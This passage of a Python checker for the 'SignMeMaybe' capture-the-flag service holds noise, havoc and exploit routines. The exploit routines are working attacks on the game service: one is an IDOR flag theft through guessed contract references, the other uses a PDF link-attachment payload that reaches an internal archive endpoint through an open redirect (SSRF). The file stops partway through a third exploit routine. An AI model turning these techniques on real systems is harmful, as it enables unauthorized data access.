    user_id, _username, _token = await client.register_user(username, password)

    await db.set(
        "noise_auth_session",
        {
            "username": username,
            "password": password,
            "userId": user_id,
        },
    )


@checker.getnoise(0)
async def getnoise_auth_session(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    try:
        stored = await db.get("noise_auth_session")
        username = stored["username"]
        password = stored["password"]
        user_id = stored["userId"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putnoise; the previous putnoise likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the noise user")
    logged_in_user_id, _username, token = await client.login_user(username, password)
    assert_equals(logged_in_user_id, user_id, "Logged-in noise user id was incorrect")

    logger.debug("Checking current noise user after login")
    status, data = await client.current_user(token)
    if status != 200:
        raise MumbleException(f"Could not retrieve logged-in noise user: HTTP {status}")
    data_obj = require_json_object(data, "logged-in noise user response")
    assert_equals(data_obj.get("id"), user_id, "Logged-in /api/me id was incorrect")
    assert_equals(data_obj.get("username"), username, "Current noise user was incorrect")


@checker.putnoise(1)
async def putnoise_contract_editing(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()
    original_title = "Draft Contract " + random_suffix(12)
    original_content = "Original editable contract body " + random_suffix(36)
    edited_title = "Edited Contract " + random_suffix(12)
    edited_content = "Edited contract body " + random_suffix(36)

    logger.debug("Registering contract edit noise user")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating editable noise contract")
    created = await client.create_contract(token, original_title, original_content)
    reference = get_string_field(created, "reference", "editable contract creation response")

    logger.debug("Editing noise contract")
    status, data = await client.update_contract(token, reference, edited_title, edited_content)
    if status != 200:
        raise MumbleException(f"Could not edit noise contract: HTTP {status}")
    data_obj = require_json_object(data, "editable contract update response")
    assert_equals(data_obj.get("reference"), reference, "Edited contract reference changed")
    assert_equals(data_obj.get("versionNumber"), 2, "Edited contract version was incorrect")
    checksum = get_string_field(data_obj, "checksum", "editable contract update response")
    assert_equals(data_obj.get("title"), edited_title, "Edited contract title was incorrect")

    await db.set(
        "noise_contract_edit",
        {
            "username": username,
            "password": password,
            "reference": reference,
            "originalContent": original_content,
            "editedTitle": edited_title,
            "editedContent": edited_content,
            "editedChecksum": checksum,
        },
    )


@checker.getnoise(1)
async def getnoise_contract_editing(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    try:
        stored = await db.get("noise_contract_edit")
        username = stored["username"]
        password = stored["password"]
        reference = stored["reference"]
        original_content = stored["originalContent"]
        edited_title = stored["editedTitle"]
        edited_content = stored["editedContent"]
        edited_checksum = stored["editedChecksum"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putnoise; the previous putnoise likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the contract edit noise user")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving edited noise contract")
    status, data = await client.latest_contract_version(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve edited noise contract: HTTP {status}")
    data_obj = require_json_object(data, "edited contract latest response")
    assert_equals(data_obj.get("reference"), reference, "Edited contract reference was not stable")
    assert_equals(data_obj.get("versionNumber"), 2, "Edited contract latest version was incorrect")
    assert_equals(data_obj.get("title"), edited_title, "Edited contract latest title was incorrect")
    assert_equals(
        get_string_field(data_obj, "content", "edited contract latest response"),
        edited_content,
        "Edited contract latest content was incorrect",
    )
    assert_equals(data_obj.get("checksum"), edited_checksum, "Edited contract latest checksum was incorrect")
    if original_content in json.dumps(data_obj, ensure_ascii=False):
        raise MumbleException("Original contract content was still visible after edit")

    logger.debug("Checking public edited contract metadata")
    status, public_data = await client.public_contracts_by_username(username)
    if status != 200:
        raise MumbleException(f"Could not retrieve public edited contract metadata: HTTP {status}")
    public_obj = require_json_object(public_data, "public edited contract metadata response")
    assert_equals(public_obj.get("username"), username, "Public edited metadata username was incorrect")
    public_contracts = public_obj.get("contracts")
    if not isinstance(public_contracts, list):
        raise MumbleException("Public edited metadata did not contain a contracts list")

    matching_public_contracts = [
        contract for contract in public_contracts
        if isinstance(contract, dict)
        and contract.get("title") == edited_title
        and isinstance(contract.get("latestVersion"), dict)
        and contract["latestVersion"].get("versionNumber") == 2
        and normalize_checksum(contract["latestVersion"].get("checksum")) == edited_checksum
    ]
    if not matching_public_contracts:
        raise MumbleException("Edited contract latest version was missing from public metadata")


@checker.putnoise(2)
async def putnoise_archive_packet_edges(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()
    no_packet_title = "Plain Packet Check " + random_suffix(12)
    no_packet_content = "Plain contract without archive packet " + random_suffix(36)
    packet_title = "Packet Edge Check " + random_suffix(12)
    packet_content = "Packet contract public body " + random_suffix(36)
    archive_packet = "harmless archive packet " + random_suffix(36)

    logger.debug("Registering archive packet edge noise user")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating no-packet noise contract")
    no_packet = await client.create_contract(token, no_packet_title, no_packet_content)
    no_packet_reference = get_string_field(no_packet, "reference", "no-packet contract creation response")

    logger.debug("Creating packet noise contract")
    packet = await client.create_contract(token, packet_title, packet_content, archive_packet=archive_packet)
    packet_reference = get_string_field(packet, "reference", "packet contract creation response")

    await db.set(
        "noise_archive_packet_edges",
        {
            "username": username,
            "password": password,
            "noPacketReference": no_packet_reference,
            "packetReference": packet_reference,
            "archivePacket": archive_packet,
        },
    )


@checker.getnoise(2)
async def getnoise_archive_packet_edges(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    try:
        stored = await db.get("noise_archive_packet_edges")
        username = stored["username"]
        password = stored["password"]
        no_packet_reference = stored["noPacketReference"]
        packet_reference = stored["packetReference"]
        archive_packet = stored["archivePacket"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putnoise; the previous putnoise likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as archive packet edge owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving owner archive packet")
    status, packet_bytes, _headers = await client.archive_packet(token, packet_reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve owner archive packet: HTTP {status}")
    if packet_bytes != archive_packet.encode("utf-8"):
        raise MumbleException("Owner archive packet content was incorrect")

    logger.debug("Checking no-packet contract returns not found for packet retrieval")
    status, _packet_bytes, _headers = await client.archive_packet(token, no_packet_reference)
    if status != 404:
        raise MumbleException(f"No-packet contract archive lookup did not return not found: HTTP {status}")

    logger.debug("Checking different logged-in user cannot fetch archive packet")
    other_username = random_username()
    other_password = random_password()
    _other_user_id, _other_username, other_token = await client.register_user(other_username, other_password)
    status, _packet_bytes, _headers = await client.archive_packet(other_token, packet_reference)
    if status != 403:
        raise MumbleException(f"Different user archive packet lookup was not forbidden: HTTP {status}")


@checker.putnoise(3)
async def putnoise_signing_state(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()
    title = "Signing State Contract " + random_suffix(12)
    content = "Signing state public contract body " + random_suffix(36)
    display_name = "Signing State Authority " + random_suffix(12)

    logger.debug("Registering signing state noise user")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating harmless signing state contract")
    created = await client.create_contract(token, title, content)
    reference = get_string_field(created, "reference", "signing state contract creation response")
    checksum = get_string_field(created, "checksum", "signing state contract creation response")

    logger.debug("Creating harmless signing state authority")
    authority = await client.create_signing_authority(token, display_name)
    authority_id = get_string_field(authority, "authorityId", "signing state authority creation response")

    logger.debug("Creating signing ceremony with default base point")
    status, ceremony_data = await client.create_signature_ceremony(token, authority_id, reference)
    if status not in (200, 201):
        raise MumbleException(f"Could not create signing state ceremony: HTTP {status}")
    ceremony_obj = require_json_object(ceremony_data, "signing state ceremony response")
    ceremony_id = get_string_field(ceremony_obj, "ceremonyId", "signing state ceremony response")
    ceremony_contract = require_json_object(ceremony_obj.get("contract"), "signing state ceremony contract response")
    assert_equals(ceremony_contract.get("reference"), reference, "Signing state ceremony targeted wrong contract")

    logger.debug("Validating signing state ceremony")
    status, validation_data = await client.validate_signature_ceremony(token, ceremony_id)
    if status != 200:
        raise MumbleException(f"Could not validate signing state ceremony: HTTP {status}")
    validation_obj = require_json_object(validation_data, "signing state validation response")
    if validation_obj.get("valid") is not True:
        raise MumbleException("Signing state ceremony did not validate")

    await db.set(
        "noise_signing_state",
        {
            "username": username,
            "password": password,
            "title": title,
            "content": content,
            "reference": reference,
            "checksum": checksum,
            "authorityId": authority_id,
            "ceremonyId": ceremony_id,
        },
    )


@checker.getnoise(3)
async def getnoise_signing_state(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    try:
        stored = await db.get("noise_signing_state")
        username = stored["username"]
        password = stored["password"]
        title = stored["title"]
        content = stored["content"]
        reference = stored["reference"]
        checksum = stored["checksum"]
        authority_id = stored["authorityId"]
        ceremony_id = stored["ceremonyId"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putnoise; the previous putnoise likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as signing state noise user")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving stored signing ceremony")
    status, ceremony_data = await client.signature_ceremony(token, ceremony_id)
    if status != 200:
        raise MumbleException(f"Could not retrieve signing state ceremony: HTTP {status}")
    ceremony_obj = require_json_object(ceremony_data, "stored signing ceremony response")
    assert_equals(ceremony_obj.get("ceremonyId"), ceremony_id, "Signing state ceremony id was incorrect")
    assert_equals(ceremony_obj.get("authorityId"), authority_id, "Signing state ceremony authority was incorrect")
    assert_equals(ceremony_obj.get("validationState"), "valid", "Signing state ceremony validation state was incorrect")
    ceremony_contract = require_json_object(ceremony_obj.get("contract"), "stored signing ceremony contract response")
    assert_equals(ceremony_contract.get("reference"), reference, "Signing state ceremony contract was incorrect")
    assert_equals(ceremony_contract.get("title"), title, "Signing state ceremony contract title was incorrect")
    assert_equals(ceremony_contract.get("checksum"), checksum, "Signing state ceremony contract checksum was incorrect")

    logger.debug("Re-validating signing state ceremony")
    status, validation_data = await client.validate_signature_ceremony(token, ceremony_id)
    if status != 200:
        raise MumbleException(f"Could not re-validate signing state ceremony: HTTP {status}")
    validation_obj = require_json_object(validation_data, "signing state revalidation response")
    if validation_obj.get("valid") is not True:
        raise MumbleException("Signing state ceremony revalidation was not idempotently valid")
    assert_equals(validation_obj.get("validationState"), "valid", "Signing state revalidation state was incorrect")
    validation_contract = require_json_object(validation_obj.get("contract"), "signing state revalidation contract response")
    assert_equals(validation_contract.get("reference"), reference, "Signing state revalidation contract was incorrect")

    logger.debug("Checking signed contract cannot be edited")
    status, _data = await client.update_contract(
        token,
        reference,
        title + " Updated",
        content + " edited after signing",
    )
    if status != 409:
        raise MumbleException(f"Signed contract edit was not rejected: HTTP {status}")

    logger.debug("Checking signed contract state")
    status, contract_data = await client.latest_contract_version(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve signed signing state contract: HTTP {status}")
    contract_obj = require_json_object(contract_data, "signed signing state contract response")
    assert_equals(contract_obj.get("approvalState"), "signed", "Signing state contract approval state was incorrect")


@checker.havoc(0)
async def havoc_health(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    client = make_client(task, logger)

    logger.debug("Checking health endpoint")
    status, data = await client.request_json("GET", "/health")

    if status != 200:
        raise MumbleException(f"Health endpoint returned HTTP {status}")

    data_obj = require_json_object(data, "health response")
    assert_equals(data_obj.get("status"), "ok", "Health endpoint did not report ok")

    logger.debug("Checking info endpoint")
    status, data = await client.request_json("GET", "/api/info")

    if status != 200:
        raise MumbleException(f"Info endpoint returned HTTP {status}")

    data_obj = require_json_object(data, "info response")
    assert_equals(data_obj.get("service"), "SignMeMaybe", "Info endpoint service was incorrect")
    assert_equals(data_obj.get("status"), "online", "Info endpoint status was incorrect")


@checker.havoc(1)
async def havoc_rejections(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    # Heavy live-game havoc logic disabled to avoid checker-wide timeout cascades.
    return

    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Checking that login rejects an unknown account")
    status, _data = await client.request_json(
        "POST",
        "/api/login",
        {
            "username": username,
            "password": password,
        },
    )
    if status != 401:
        raise MumbleException(f"Unknown-account login was not rejected: HTTP {status}")

    logger.debug("Checking that duplicate registration is rejected")
    _user_id, _username, token = await client.register_user(username, password)
    status, _data = await client.request_json(
        "POST",
        "/api/register",
        {
            "username": username,
            "password": password,
        },
    )
    if status != 409:
        raise MumbleException(f"Duplicate registration was not rejected: HTTP {status}")

    logger.debug("Checking that invalid registration input is rejected")
    status, _data = await client.request_json(
        "POST",
        "/api/register",
        {
            "username": "x",
            "password": "tiny",
        },
    )
    if status != 400:
        raise MumbleException(f"Invalid registration input was not rejected: HTTP {status}")

    logger.debug("Checking that /api/me rejects missing authentication")
    status, _data = await client.request_json("GET", "/api/me")
    if status != 401:
        raise MumbleException(f"Unauthenticated /api/me was not rejected: HTTP {status}")

    logger.debug("Checking that contract listing rejects missing authentication")
    status, _data = await client.request_json("GET", "/api/contracts")
    if status != 401:
        raise MumbleException(f"Unauthenticated contract listing was not rejected: HTTP {status}")

    logger.debug("Checking that contract creation rejects missing authentication")
    status, _data = await client.request_json(
        "POST",
        "/api/contracts",
        {
            "title": "Rejected Contract " + random_suffix(12),
            "content": "stateless rejection check " + random_suffix(24),
        },
    )
    if status != 401:
        raise MumbleException(f"Unauthenticated contract creation was not rejected: HTTP {status}")

    unknown_reference = "CNTR-" + random_suffix(24)

    logger.debug("Checking that contract update rejects missing authentication")
    status, _data = await client.update_contract(
        None,
        unknown_reference,
        "Rejected Update " + random_suffix(12),
        "unauthenticated update check " + random_suffix(24),
    )
    if status != 401:
        raise MumbleException(f"Unauthenticated contract update was not rejected: HTTP {status}")

    logger.debug("Checking that latest contract lookup rejects missing authentication")
    status, _data = await client.request_json(
        "GET",
        f"/api/contracts/{unknown_reference}/versions/latest",
    )
    if status != 401:
        raise MumbleException(f"Unauthenticated contract latest lookup was not rejected: HTTP {status}")

    logger.debug("Checking that contract PDF lookup rejects missing authentication")
    status, _pdf_bytes, _headers = await client.request_bytes(
        "GET",
        f"/api/contracts/{unknown_reference}/versions/latest/pdf",
    )
    if status != 401:
        raise MumbleException(f"Unauthenticated contract PDF lookup was not rejected: HTTP {status}")

    logger.debug("Checking that archive packet lookup rejects missing authentication")
    status, _packet_bytes, _headers = await client.request_bytes(
        "GET",
        f"/api/contracts/{unknown_reference}/archive/packet",
    )
    if status != 401:
        raise MumbleException(f"Unauthenticated archive packet lookup was not rejected: HTTP {status}")

    logger.debug("Checking that invalid contract creation input is rejected")
    status, _data = await client.request_json(
        "POST",
        "/api/contracts",
        {
            "title": "",
            "content": "invalid create payload " + random_suffix(24),
        },
        token=token,
    )
    if status != 400:
        raise MumbleException(f"Invalid contract creation input was not rejected: HTTP {status}")

    logger.debug("Checking that invalid contract update input is rejected")
    status, _data = await client.update_contract(
        token,
        unknown_reference,
        "",
        "invalid update payload " + random_suffix(24),
    )
    if status != 400:
        raise MumbleException(f"Invalid contract update input was not rejected: HTTP {status}")

    logger.debug("Checking that unknown latest contract lookup returns not found")
    status, _data = await client.latest_contract_version(token, unknown_reference)
    if status != 404:
        raise MumbleException(f"Unknown contract latest lookup did not return not found: HTTP {status}")

    logger.debug("Checking that unknown contract PDF lookup returns not found")
    status, _pdf_bytes, _headers = await client.latest_contract_pdf(token, unknown_reference)
    if status != 404:
        raise MumbleException(f"Unknown contract PDF lookup did not return not found: HTTP {status}")

    logger.debug("Checking that unknown contract update returns not found")
    status, _data = await client.update_contract(
        token,
        unknown_reference,
        "Unknown Update " + random_suffix(12),
        "unknown update payload " + random_suffix(24),
    )
    if status != 404:
        raise MumbleException(f"Unknown contract update did not return not found: HTTP {status}")

    # checker skips this because this caused too much mumbling due to to slow during CTF. Will fix later
    # logger.debug("Checking that unknown archive packet lookup returns not found")
    # status, _packet_bytes, _headers = await client.archive_packet(token, unknown_reference)
    # if status != 404:
    #     raise MumbleException(f"Unknown archive packet lookup did not return not found: HTTP {status}")

    # checker skips this because this caused too much mumbling due to to slow during CTF. Will fix later
    # logger.debug("Checking that an unknown public holder returns not found")
    # status, _data = await client.public_contracts_by_username("missing_" + random_suffix(12))
    # if status != 404:
    #     raise MumbleException(f"Unknown public holder did not return not found: HTTP {status}")

    logger.debug("Checking that malformed public holder input is rejected")
    status, _data = await client.request_json("GET", "/api/users/%20/contracts")
    if status != 400:
        raise MumbleException(f"Malformed public holder lookup was not rejected: HTTP {status}")


@checker.havoc(2)
async def havoc_signing_rejections(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    # Heavy live-game havoc logic disabled to avoid checker-wide timeout cascades.
    return

    client = make_client(task, logger)

    logger.debug("Checking public signing curve metadata")
    status, data = await client.signing_curves()
    if status != 200:
        raise MumbleException(f"Signing curves endpoint returned HTTP {status}")
    data_obj = require_json_object(data, "signing curves response")
    curves = data_obj.get("curves")
    if not isinstance(curves, list):
        raise MumbleException("Signing curves response did not contain a curves list")
    curve_names = {curve.get("name") for curve in curves if isinstance(curve, dict)}
    expected_curve_names = {"P-256", "P-384", "brainpoolP256r1", "brainpoolP384r1"}
    if not expected_curve_names.issubset(curve_names):
        raise MumbleException("Signing curves response was missing expected named curves")

    unknown_authority = "SIG-" + random_suffix(24)
    unknown_ceremony = "SGC-" + random_suffix(24)

    logger.debug("Checking signing authority listing rejects missing authentication")
    status, _data = await client.request_json("GET", "/api/signing/authorities")
    assert_status(status, 401, "Unauthenticated signing authority listing was not rejected")

    logger.debug("Checking signing authority creation rejects missing authentication")
    status, _data = await client.request_json(
        "POST",
        "/api/signing/authorities",
        {
            "displayName": "Rejected Authority " + random_suffix(12),
            "curveName": SIGNING_CURVE_NAME,
        },
    )
    assert_status(status, 401, "Unauthenticated signing authority creation was not rejected")

    logger.debug("Checking signing secret lookup rejects missing authentication")
    status, _data = await client.request_json(
        "GET",
        f"/api/signing/authorities/{unknown_authority}/secret",
    )
    assert_status(status, 401, "Unauthenticated signing secret lookup was not rejected")

    logger.debug("Checking ceremony creation rejects missing authentication")
    status, _data = await client.request_json(
        "POST",
        f"/api/signing/authorities/{unknown_authority}/ceremonies",
        {
            "contractReference": "CNTR-" + random_suffix(24),
            "curveName": SIGNING_CURVE_NAME,
        },
    )
    assert_status(status, 401, "Unauthenticated ceremony creation was not rejected")

    logger.debug("Checking ceremony get rejects missing authentication")
    status, _data = await client.signature_ceremony(None, unknown_ceremony)
    assert_status(status, 401, "Unauthenticated ceremony get was not rejected")

    logger.debug("Checking ceremony validation rejects missing authentication")
    status, _data = await client.request_json(
        "POST",
        f"/api/signing/ceremonies/{unknown_ceremony}/validate",
    )
    assert_status(status, 401, "Unauthenticated ceremony validation was not rejected")

    username = random_username()
    password = random_password()
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Checking invalid authority display name is rejected")
    status, _data = await client.request_json(
        "POST",
        "/api/signing/authorities",
        {
            "displayName": " ",
            "curveName": SIGNING_CURVE_NAME,
        },
        token=token,
    )
    assert_status(status, 400, "Invalid signing authority display name was not rejected")

    logger.debug("Checking unknown signing curve is rejected")
    status, _data = await client.request_json(
        "POST",
        "/api/signing/authorities",
        {
            "displayName": "Unknown Curve Authority " + random_suffix(12),
            "curveName": "P-521",
        },
        token=token,
    )
    assert_status(status, 400, "Unknown signing curve was not rejected")

    logger.debug("Checking oversized signing secret is rejected")
    status, _data = await client.request_json(
        "POST",
        "/api/signing/authorities",
        {
            "displayName": "Oversized Secret Authority " + random_suffix(12),
            "curveName": SIGNING_CURVE_NAME,
            "signingSecret": "s" * 4097,
        },
        token=token,
    )
    assert_status(status, 400, "Oversized signing secret was not rejected")

    logger.debug("Checking empty signing secret lookup returns not found")
    authority = await client.create_signing_authority(token, "Empty Secret Authority " + random_suffix(12))
    authority_id = get_string_field(authority, "authorityId", "empty-secret authority creation response")
    status, _data = await client.signing_secret(token, authority_id)
    assert_status(status, 404, "Empty signing secret lookup did not return not found")

    logger.debug("Checking unknown public signing user returns not found")
    status, _data = await client.public_signing_authorities_by_username("missing_" + random_suffix(12))
    assert_status(status, 404, "Unknown public signing user did not return not found")

    logger.debug("Checking unknown ceremony get returns not found")
    status, _data = await client.signature_ceremony(token, unknown_ceremony)
    assert_status(status, 404, "Unknown ceremony get did not return not found")

    logger.debug("Checking unknown ceremony validation returns not found")
    status, _data = await client.validate_signature_ceremony(token, unknown_ceremony)
    assert_status(status, 404, "Unknown ceremony validation did not return not found")

    # checker skips this because this caused too much mumbling due to to slow during CTF. Will fix later
    # logger.debug("Checking missing contract reference during ceremony creation is rejected")
    # status, _data = await client.create_signature_ceremony(token, authority_id, " ")
    # assert_status(status, 400, "Missing ceremony contract reference was not rejected")

    # checker skips this because this caused too much mumbling due to to slow during CTF. Will fix later
    # logger.debug("Checking unknown contract reference during ceremony creation returns not found")
    # status, _data = await client.create_signature_ceremony(token, authority_id, "CNTR-" + random_suffix(24))
    # assert_status(status, 404, "Unknown ceremony contract reference did not return not found")

    # checker skips this because this caused too much mumbling due to to slow during CTF. Will fix later
    # logger.debug("Checking ceremony curve mismatch is rejected")
    # contract = await client.create_contract(
    #     token,
    #     "Curve Mismatch Contract " + random_suffix(12),
    #     "curve mismatch public contract body " + random_suffix(36),
    # )
    # reference = get_string_field(contract, "reference", "curve mismatch contract creation response")
    # status, _data = await client.create_signature_ceremony(
    #     token,
    #     authority_id,
    #     reference,
    #     curve_name="P-384",
    # )
    # assert_status(status, 400, "Ceremony curve mismatch was not rejected")


@checker.havoc(3)
async def havoc_cross_account_access(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    # Heavy live-game havoc logic disabled to avoid checker-wide timeout cascades.
    return

    client = make_client(task, logger)

    owner_username = random_username()
    owner_password = random_password()
    _owner_user_id, _owner_username, owner_token = await client.register_user(owner_username, owner_password)

    other_username = random_username()
    other_password = random_password()
    _other_user_id, _other_username, other_token = await client.register_user(other_username, other_password)

    unrelated_username = random_username()
    unrelated_password = random_password()
    _unrelated_user_id, _unrelated_username, unrelated_token = await client.register_user(
        unrelated_username,
        unrelated_password,
    )

    logger.debug("Creating owner contract with archive packet")
    owner_contract = await client.create_contract(
        owner_token,
        "ACL Contract " + random_suffix(12),
        "owner access-control contract body " + random_suffix(36),
        archive_packet="acl archive packet " + random_suffix(36),
    )
    owner_reference = get_string_field(owner_contract, "reference", "ACL contract creation response")

    logger.debug("Creating owner signing authority with harmless secret")
    owner_authority = await client.create_signing_authority(
        owner_token,
        "ACL Owner Authority " + random_suffix(12),
        signing_secret="acl signing note " + random_suffix(36),
    )
    owner_authority_id = get_string_field(owner_authority, "authorityId", "ACL owner authority creation response")

    logger.debug("Checking non-owner contract edit is forbidden")
    status, _data = await client.update_contract(
        other_token,
        owner_reference,
        "Forbidden ACL Update " + random_suffix(12),
        "non-owner update payload " + random_suffix(24),
    )
    assert_status(status, 403, "Non-owner contract edit was not forbidden")

    logger.debug("Checking non-owner packet fetch is forbidden")
    status, _packet_bytes, _headers = await client.archive_packet(other_token, owner_reference)
    assert_status(status, 403, "Non-owner archive packet fetch was not forbidden")

    logger.debug("Checking non-owner signing secret lookup is forbidden")
    status, _data = await client.signing_secret(other_token, owner_authority_id)
    assert_status(status, 403, "Non-owner signing secret lookup was not forbidden")

    logger.debug("Creating second-user signing authority for ceremony ACL check")
    other_authority = await client.create_signing_authority(
        other_token,
        "ACL Ceremony Authority " + random_suffix(12),
    )
    other_authority_id = get_string_field(other_authority, "authorityId", "ACL ceremony authority creation response")

    logger.debug("Creating cross-account ceremony with default base point")
    status, ceremony_data = await client.create_signature_ceremony(
        owner_token,
        other_authority_id,
        owner_reference,
    )
    if status not in (200, 201):
        raise MumbleException(f"Could not create cross-account ceremony: HTTP {status}")
    ceremony_obj = require_json_object(ceremony_data, "cross-account ceremony creation response")
    ceremony_id = get_string_field(ceremony_obj, "ceremonyId", "cross-account ceremony creation response")

    logger.debug("Checking requester can retrieve ceremony")
    status, data = await client.signature_ceremony(owner_token, ceremony_id)
    assert_status(status, 200, "Requester ceremony retrieval failed")
    data_obj = require_json_object(data, "requester ceremony response")
    assert_equals(data_obj.get("ceremonyId"), ceremony_id, "Requester ceremony id was incorrect")

    logger.debug("Checking authority owner can retrieve ceremony")
    status, data = await client.signature_ceremony(other_token, ceremony_id)
    assert_status(status, 200, "Authority owner ceremony retrieval failed")
    data_obj = require_json_object(data, "authority owner ceremony response")
    assert_equals(data_obj.get("authorityId"), other_authority_id, "Authority owner ceremony authority was incorrect")

    logger.debug("Checking requester can validate ceremony")
    status, data = await client.validate_signature_ceremony(owner_token, ceremony_id)
    assert_status(status, 200, "Requester ceremony validation failed")
    data_obj = require_json_object(data, "requester ceremony validation response")
    if data_obj.get("valid") is not True:
        raise MumbleException("Requester ceremony validation did not report valid")

    logger.debug("Checking authority owner can revalidate ceremony")
    status, data = await client.validate_signature_ceremony(other_token, ceremony_id)
    assert_status(status, 200, "Authority owner ceremony validation failed")
    data_obj = require_json_object(data, "authority owner ceremony validation response")
    if data_obj.get("valid") is not True:
        raise MumbleException("Authority owner ceremony validation did not report valid")

    logger.debug("Checking unrelated user cannot retrieve ceremony")
    status, _data = await client.signature_ceremony(unrelated_token, ceremony_id)
    assert_status(status, 403, "Unrelated ceremony retrieval was not forbidden")

    logger.debug("Checking unrelated user cannot validate ceremony")
    status, _data = await client.validate_signature_ceremony(unrelated_token, ceremony_id)
    assert_status(status, 403, "Unrelated ceremony validation was not forbidden")


@checker.exploit(0)
async def exploit_checksum_idor(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Registering attacker account")
    _user_id, _username, token = await client.register_user(username, password)

    target_usernames = extract_usernames_from_hints(task)
    if not target_usernames:
        raise MumbleException("Checker task did not contain target metadata")

    logger.debug("Resolving %d target usernames via public contract metadata", len(target_usernames))
    for target_username in target_usernames:
        status, data = await client.public_contracts_by_username(target_username)

        if status == 404:
            continue
        if status != 200:
            logger.debug("Skipping username %s because metadata returned HTTP %s", target_username, status)
            continue
        if not isinstance(data, dict):
            continue

        public_username = data.get("username")
        if not isinstance(public_username, str) or not public_username:
            public_username = target_username

        contracts = data.get("contracts")
        if not isinstance(contracts, list):
            continue

        for contract in contracts:
            if not isinstance(contract, dict):
                continue

            reference = reference_from_public_contract(public_username, contract)
            if reference is None:
                continue

            status, latest_data = await client.latest_contract_version(token, reference)
            if status == 200:
                latest_bytes = json.dumps(latest_data, ensure_ascii=False).encode("utf-8")
                if flag := searcher.search_flag(latest_bytes):
                    return flag

            status, pdf_bytes, _headers = await client.latest_contract_pdf(token, reference)
            if status != 200:
                continue

            if flag := searcher.search_flag(pdf_bytes):
                return flag

    raise MumbleException("flag not found")


@checker.exploit(1)
async def exploit_annex_archive(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Registering attacker account")
    _user_id, _username, token = await client.register_user(username, password)

    target_usernames = extract_usernames_from_hints(task)
    if not target_usernames:
        raise MumbleException("Checker task did not contain target metadata")

    logger.debug("Resolving %d target usernames via public archive metadata", len(target_usernames))
    for target_username in target_usernames:
        status, data = await client.public_contracts_by_username(target_username)

        if status == 404:
            continue
        if status != 200:
            logger.debug("Skipping username %s because metadata returned HTTP %s", target_username, status)
            continue
        if not isinstance(data, dict):
            continue

        contracts = data.get("contracts")
        if not isinstance(contracts, list):
            continue

        for contract in contracts:
            if not isinstance(contract, dict):
                continue

            archive_ticket = contract.get("archiveTicket")
            if not isinstance(archive_ticket, str) or not archive_ticket:
                continue

            internal_url = (
                f"http://127.0.0.1:{SERVICE_PORT}/internal/archive/packets/"
                f"{parse.quote(archive_ticket, safe='')}"
            )
            redirect_url = (
                f"{client.base_url}/api/links/leave?to="
                f"{parse.quote(internal_url, safe='')}"
            )
            annex_content = (
                '<link rel="attachment" title="archive-packet.txt" '
                f'href="{redirect_url}">'
            )

            created = await client.create_contract(
                token,
                "Certified Evidence Review " + random_suffix(12),
                annex_content,
            )
            attacker_reference = get_string_field(created, "reference", "attacker contract creation response")

            status, pdf_bytes, _headers = await client.latest_contract_pdf(token, attacker_reference)
            if status != 200:
                logger.debug("Skipping stamp because PDF returned HTTP %s", status)
                continue
            if b"/EmbeddedFiles" not in pdf_bytes:
                continue

            if flag := searcher.search_flag(pdf_bytes):
                return flag

    raise MumbleException("flag not found")


@checker.exploit(2)
async def exploit_faulty_curve_signing(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Registering attacker account")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating attacker-owned contract for signing probes")
    attacker_contract = await client.create_contract(
        token,
        "Fault Review Contract " + random_suffix(12),
        "Fault review public contract body " + random_suffix(36),
    )
    attacker_reference = get_string_field(attacker_contract, "reference", "attacker signing contract creation response")

    target_usernames = extract_usernames_from_hints(task)
    if not target_usernames:
        raise MumbleException("Checker task did not contain target metadata")

